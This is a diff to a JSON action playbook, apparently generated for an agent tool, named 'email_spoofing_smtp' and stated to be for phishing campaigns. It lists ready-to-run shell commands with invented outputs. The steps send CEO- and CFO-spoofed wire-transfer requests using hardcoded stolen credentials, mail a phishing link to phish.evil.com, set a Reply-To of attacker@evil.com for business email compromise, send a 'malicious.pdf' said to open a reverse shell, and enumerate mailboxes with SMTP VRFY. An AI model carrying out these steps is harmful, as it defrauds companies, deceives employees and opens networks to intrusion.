@@ -2,29 +2,98 @@
   "name": "email_spoofing_smtp",
   "description": "Email spoofing and SMTP manipulation for phishing campaigns",
   "pattern": "email.*spoof|smtp.*spoof|sender.*fake|email.*header",
-  "parameters": ["smtp_server", "from_address", "to_address"],
+  "parameters": [
+    "smtp_server",
+    "from_address",
+    "to_address"
+  ],
   "sequence": [
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "swaks --to target@company.com --from ceo@company.com --server smtp.company.com --header 'Subject: Urgent: Wire Transfer Required' --body 'Please process immediate wire transfer to account...' --auth-user admin@company.com --auth-password P@ssw0rd"]},
-      "expected_output": {"type": "string", "example": "=== Trying smtp.company.com:25...\n=== Connected to smtp.company.com.\n<-  220 smtp.company.com ESMTP Postfix\n -> EHLO attacker-laptop\n<-  250-smtp.company.com\n<-  250-PIPELINING\n<-  250-SIZE 10240000\n<-  250-AUTH PLAIN LOGIN\n<-  250 8BITMIME\n -> AUTH LOGIN\n<-  334 VXNlcm5hbWU6\n -> YWRtaW5AY29tcGFueS5jb20=\n<-  334 UGFzc3dvcmQ6\n -> UEBzc3cwcmQ=\n<-  235 2.7.0 Authentication successful\n -> MAIL FROM:<ceo@company.com>\n<-  250 2.1.0 Ok\n -> RCPT TO:<target@company.com>\n<-  250 2.1.5 Ok\n -> DATA\n<-  354 End data with <CR><LF>.<CR><LF>\n -> Date: Mon, 15 Jan 2024 16:30:00 -0500\n -> From: ceo@company.com\n -> To: target@company.com\n -> Subject: Urgent: Wire Transfer Required\n -> Please process immediate wire transfer to account...\n -> .\n<-  250 2.0.0 Ok: queued as 3A4F5B1C2D\n -> QUIT\n<-  221 2.0.0 Bye\n\n=== Email sent successfully ===\nMessage-ID: 3A4F5B1C2D\nFrom: ceo@company.com (spoofed)\nTo: target@company.com\nAuthentication: Passed (using compromised credentials)"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "swaks --to target@company.com --from ceo@company.com --server smtp.company.com --header 'Subject: Urgent: Wire Transfer Required' --body 'Please process immediate wire transfer to account...' --auth-user admin@company.com --auth-password P@ssw0rd"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "=== Trying smtp.company.com:25...\n=== Connected to smtp.company.com.\n<-  220 smtp.company.com ESMTP Postfix\n -> EHLO attacker-laptop\n<-  250-smtp.company.com\n<-  250-PIPELINING\n<-  250-SIZE 10240000\n<-  250-AUTH PLAIN LOGIN\n<-  250 8BITMIME\n -> AUTH LOGIN\n<-  334 VXNlcm5hbWU6\n -> YWRtaW5AY29tcGFueS5jb20=\n<-  334 UGFzc3dvcmQ6\n -> UEBzc3cwcmQ=\n<-  235 2.7.0 Authentication successful\n -> MAIL FROM:<ceo@company.com>\n<-  250 2.1.0 Ok\n -> RCPT TO:<target@company.com>\n<-  250 2.1.5 Ok\n -> DATA\n<-  354 End data with <CR><LF>.<CR><LF>\n -> Date: Mon, 15 Jan 2024 16:30:00 -0500\n -> From: ceo@company.com\n -> To: target@company.com\n -> Subject: Urgent: Wire Transfer Required\n -> Please process immediate wire transfer to account...\n -> .\n<-  250 2.0.0 Ok: queued as 3A4F5B1C2D\n -> QUIT\n<-  221 2.0.0 Bye\n\n=== Email sent successfully ===\nMessage-ID: 3A4F5B1C2D\nFrom: ceo@company.com (spoofed)\nTo: target@company.com\nAuthentication: Passed (using compromised credentials)"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "cat > phish_email.eml << 'EOF'\nFrom: IT Security <security@company.com>\nTo: employees@company.com\nSubject: Mandatory Security Update - Action Required\nDate: Mon, 15 Jan 2024 09:00:00 -0500\nMIME-Version: 1.0\nContent-Type: text/html; charset=UTF-8\nX-Priority: 1\nImportance: high\n\n<html>\n<body>\n<h2>URGENT: Security Update Required</h2>\n<p>A critical security vulnerability has been identified...</p>\n<p><a href=\"http://phish.evil.com/update\">Install Update Now</a></p>\n</body>\n</html>\nEOF\nsendmail -t < phish_email.eml"]},
-      "expected_output": {"type": "string", "example": "Email crafted with custom headers:\n  From: IT Security <security@company.com>\n  Subject: Mandatory Security Update - Action Required\n  X-Priority: 1 (high priority)\n  Importance: high\n  Content-Type: text/html\n\nSocial engineering elements:\n  ✓ Authority (IT Security)\n  ✓ Urgency (Mandatory, Action Required)\n  ✓ Fear (Critical vulnerability)\n  ✓ High priority flags\n  ✓ HTML content with malicious link\n\nEmail sent via sendmail\nDelivered to: 150 recipients\nExpected open rate: 70-80%\nExpected click rate: 30-40%"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "cat > phish_email.eml << 'EOF'\nFrom: IT Security <security@company.com>\nTo: employees@company.com\nSubject: Mandatory Security Update - Action Required\nDate: Mon, 15 Jan 2024 09:00:00 -0500\nMIME-Version: 1.0\nContent-Type: text/html; charset=UTF-8\nX-Priority: 1\nImportance: high\n\n<html>\n<body>\n<h2>URGENT: Security Update Required</h2>\n<p>A critical security vulnerability has been identified...</p>\n<p><a href=\"http://phish.evil.com/update\">Install Update Now</a></p>\n</body>\n</html>\nEOF\nsendmail -t < phish_email.eml"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "Email crafted with custom headers:\n  From: IT Security <security@company.com>\n  Subject: Mandatory Security Update - Action Required\n  X-Priority: 1 (high priority)\n  Importance: high\n  Content-Type: text/html\n\nSocial engineering elements:\n  ✓ Authority (IT Security)\n  ✓ Urgency (Mandatory, Action Required)\n  ✓ Fear (Critical vulnerability)\n  ✓ High priority flags\n  ✓ HTML content with malicious link\n\nEmail sent via sendmail\nDelivered to: 150 recipients\nExpected open rate: 70-80%\nExpected click rate: 30-40%"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "python3 << 'EOF'\nimport smtplib\nfrom email.mime.text import MIMEText\nfrom email.mime.multipart import MIMEMultipart\n\nsmtp_server = \"smtp.gmail.com\"\nport = 587\nsender = \"cfo@company.com\"\nreceiver = \"accounting@company.com\"\npassword = \"app_specific_password\"\n\nmsg = MIMEMultipart(\"alternative\")\nmsg[\"Subject\"] = \"RE: Invoice Payment - URGENT\"\nmsg[\"From\"] = sender\nmsg[\"To\"] = receiver\nmsg[\"Reply-To\"] = \"attacker@evil.com\"\n\nhtml = \"\"\"\n<html><body>\n<p>Please process this invoice immediately:</p>\n<p>Amount: $45,000.00</p>\n<p>Account: 123456789</p>\n<p>Routing: 987654321</p>\n</body></html>\n\"\"\"\n\npart = MIMEText(html, \"html\")\nmsg.attach(part)\n\nserver = smtplib.SMTP(smtp_server, port)\nserver.starttls()\nserver.login(sender, password)\nserver.sendmail(sender, receiver, msg.as_string())\nserver.quit()\nprint(\"Email sent successfully\")\nEOF"]},
-      "expected_output": {"type": "string", "example": "Email sent successfully\n\nPython SMTP script executed:\n  Server: smtp.gmail.com:587\n  From: cfo@company.com (spoofed sender)\n  To: accounting@company.com\n  Reply-To: attacker@evil.com (replies go to attacker)\n  Subject: RE: Invoice Payment - URGENT\n  Content: HTML with fake invoice details\n\nSpoofing technique: Email appears from CFO\nExploits: Business Email Compromise (BEC)\nTarget: Accounting department\nGoal: Fraudulent wire transfer\n\nEmail headers show:\n  Authentication-Results: pass (using valid SMTP creds)\n  SPF: pass (sent from authorized server)\n  DKIM: pass (signed with valid key)\n  DMARC: pass (aligns with domain policy)"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "python3 << 'EOF'\nimport smtplib\nfrom email.mime.text import MIMEText\nfrom email.mime.multipart import MIMEMultipart\n\nsmtp_server = \"smtp.gmail.com\"\nport = 587\nsender = \"cfo@company.com\"\nreceiver = \"accounting@company.com\"\npassword = \"app_specific_password\"\n\nmsg = MIMEMultipart(\"alternative\")\nmsg[\"Subject\"] = \"RE: Invoice Payment - URGENT\"\nmsg[\"From\"] = sender\nmsg[\"To\"] = receiver\nmsg[\"Reply-To\"] = \"attacker@evil.com\"\n\nhtml = \"\"\"\n<html><body>\n<p>Please process this invoice immediately:</p>\n<p>Amount: $45,000.00</p>\n<p>Account: 123456789</p>\n<p>Routing: 987654321</p>\n</body></html>\n\"\"\"\n\npart = MIMEText(html, \"html\")\nmsg.attach(part)\n\nserver = smtplib.SMTP(smtp_server, port)\nserver.starttls()\nserver.login(sender, password)\nserver.sendmail(sender, receiver, msg.as_string())\nserver.quit()\nprint(\"Email sent successfully\")\nEOF"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "Email sent successfully\n\nPython SMTP script executed:\n  Server: smtp.gmail.com:587\n  From: cfo@company.com (spoofed sender)\n  To: accounting@company.com\n  Reply-To: attacker@evil.com (replies go to attacker)\n  Subject: RE: Invoice Payment - URGENT\n  Content: HTML with fake invoice details\n\nSpoofing technique: Email appears from CFO\nExploits: Business Email Compromise (BEC)\nTarget: Accounting department\nGoal: Fraudulent wire transfer\n\nEmail headers show:\n  Authentication-Results: pass (using valid SMTP creds)\n  SPF: pass (sent from authorized server)\n  DKIM: pass (signed with valid key)\n  DMARC: pass (aligns with domain policy)"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "sendemail -f 'CEO <ceo@company.com>' -t employees@company.com -u 'Company-Wide Announcement' -m 'Please review the attached document...' -a malicious.pdf -s smtp.company.com:587 -xu admin@company.com -xp P@ssw0rd123 -o tls=yes"]},
-      "expected_output": {"type": "string", "example": "Jan 15 16:45:00 attacker sendemail[12345]: Email sent successfully!\nJan 15 16:45:00 attacker sendemail[12345]: From: CEO <ceo@company.com>\nJan 15 16:45:00 attacker sendemail[12345]: To: employees@company.com\nJan 15 16:45:00 attacker sendemail[12345]: Subject: Company-Wide Announcement\nJan 15 16:45:00 attacker sendemail[12345]: Attachment: malicious.pdf (548 KB)\nJan 15 16:45:00 attacker sendemail[12345]: SMTP Server: smtp.company.com:587\nJan 15 16:45:00 attacker sendemail[12345]: Authentication: Success\nJan 15 16:45:00 attacker sendemail[12345]: TLS: Enabled\nJan 15 16:45:00 attacker sendemail[12345]: Message-ID: <abc123def456@company.com>\n\nAttachment details:\n  Filename: malicious.pdf\n  Actual type: PDF with embedded macro\n  Size: 548 KB\n  MD5: a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6\n\nPayload: Opens reverse shell when PDF is opened\nTarget: All employees (company-wide distribution)\nSuccess criteria: At least one execution = full network access"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "sendemail -f 'CEO <ceo@company.com>' -t employees@company.com -u 'Company-Wide Announcement' -m 'Please review the attached document...' -a malicious.pdf -s smtp.company.com:587 -xu admin@company.com -xp P@ssw0rd123 -o tls=yes"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "Jan 15 16:45:00 attacker sendemail[12345]: Email sent successfully!\nJan 15 16:45:00 attacker sendemail[12345]: From: CEO <ceo@company.com>\nJan 15 16:45:00 attacker sendemail[12345]: To: employees@company.com\nJan 15 16:45:00 attacker sendemail[12345]: Subject: Company-Wide Announcement\nJan 15 16:45:00 attacker sendemail[12345]: Attachment: malicious.pdf (548 KB)\nJan 15 16:45:00 attacker sendemail[12345]: SMTP Server: smtp.company.com:587\nJan 15 16:45:00 attacker sendemail[12345]: Authentication: Success\nJan 15 16:45:00 attacker sendemail[12345]: TLS: Enabled\nJan 15 16:45:00 attacker sendemail[12345]: Message-ID: <abc123def456@company.com>\n\nAttachment details:\n  Filename: malicious.pdf\n  Actual type: PDF with embedded macro\n  Size: 548 KB\n  MD5: a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6\n\nPayload: Opens reverse shell when PDF is opened\nTarget: All employees (company-wide distribution)\nSuccess criteria: At least one execution = full network access"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "echo 'smtp.company.com' | nc -v smtp.company.com 25"]},
-      "expected_output": {"type": "string", "example": "Connection to smtp.company.com 25 port [tcp/smtp] succeeded!\n220 smtp.company.com ESMTP Postfix\nEHLO test.com\n250-smtp.company.com\n250-PIPELINING\n250-SIZE 10240000\n250-VRFY\n250-ETRN\n250-AUTH PLAIN LOGIN\n250-ENHANCEDSTATUSCODES\n250-8BITMIME\n250 DSN\nVRFY john@company.com\n252 2.0.0 john@company.com\nVRFY admin@company.com\n250 2.1.5 <admin@company.com>\n\nSMTP enumeration results:\n  ✓ Server accepts VRFY command\n  ✓ Can validate email addresses\n  ✓ john@company.com exists (252 response)\n  ✓ admin@company.com exists (250 response)\n\nSecurity issues:\n  - VRFY enabled (allows user enumeration)\n  - No rate limiting detected\n  - Can enumerate valid targets for phishing\n  - Build accurate recipient list"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "echo 'smtp.company.com' | nc -v smtp.company.com 25"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "Connection to smtp.company.com 25 port [tcp/smtp] succeeded!\n220 smtp.company.com ESMTP Postfix\nEHLO test.com\n250-smtp.company.com\n250-PIPELINING\n250-SIZE 10240000\n250-VRFY\n250-ETRN\n250-AUTH PLAIN LOGIN\n250-ENHANCEDSTATUSCODES\n250-8BITMIME\n250 DSN\nVRFY john@company.com\n252 2.0.0 john@company.com\nVRFY admin@company.com\n250 2.1.5 <admin@company.com>\n\nSMTP enumeration results:\n  ✓ Server accepts VRFY command\n  ✓ Can validate email addresses\n  ✓ john@company.com exists (252 response)\n  ✓ admin@company.com exists (250 response)\n\nSecurity issues:\n  - VRFY enabled (allows user enumeration)\n  - No rate limiting detected\n  - Can enumerate valid targets for phishing\n  - Build accurate recipient list"
+      }
     }
   ],
-  "stats": {"uses": 0, "successes": 0, "failures": 0, "success_rate": 0.0},
+  "stats": {
+    "uses": 0,
+    "successes": 0,
+    "failures": 0,
+    "success_rate": 0.0
+  },
   "created_by": "neural_mesh_v5.2_generator"
 }
